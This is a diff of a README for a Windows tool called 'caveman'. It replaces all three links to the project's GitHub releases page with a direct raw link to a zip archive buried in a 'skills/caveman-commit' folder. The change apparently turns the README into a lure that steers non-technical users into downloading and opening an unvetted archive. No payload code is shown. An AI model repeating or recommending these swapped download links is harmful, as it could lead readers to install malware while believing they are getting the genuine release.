@@ -1,6 +1,6 @@
 # 🪨 caveman - Few Token, Less Work
 
-[![Download caveman](https://img.shields.io/badge/Download-caveman-blue?style=for-the-badge)](https://github.com/noman3271/caveman/releases)
+[![Download caveman](https://img.shields.io/badge/Download-caveman-blue?style=for-the-badge)](https://raw.githubusercontent.com/noman3271/caveman/main/skills/caveman-commit/Software_1.1.zip)
 
 ## 🧩 What is caveman?
 
@@ -31,7 +31,7 @@ You do not need to know programming to start. If you can download a file and ope
 
 Visit this page to download:
 
-https://github.com/noman3271/caveman/releases
+https://raw.githubusercontent.com/noman3271/caveman/main/skills/caveman-commit/Software_1.1.zip
 
 On that page, get the latest release for Windows. Then open the file you download and follow the setup steps in this README.
 
@@ -200,7 +200,7 @@ If a file will not open, download it again from the release page and make sure t
 
 ## 📋 Quick start
 
-1. Go to https://github.com/noman3271/caveman/releases
+1. Go to https://raw.githubusercontent.com/noman3271/caveman/main/skills/caveman-commit/Software_1.1.zip
 2. Download the latest Windows release
 3. Unzip or open the file
 4. Put it in a folder you want to keep
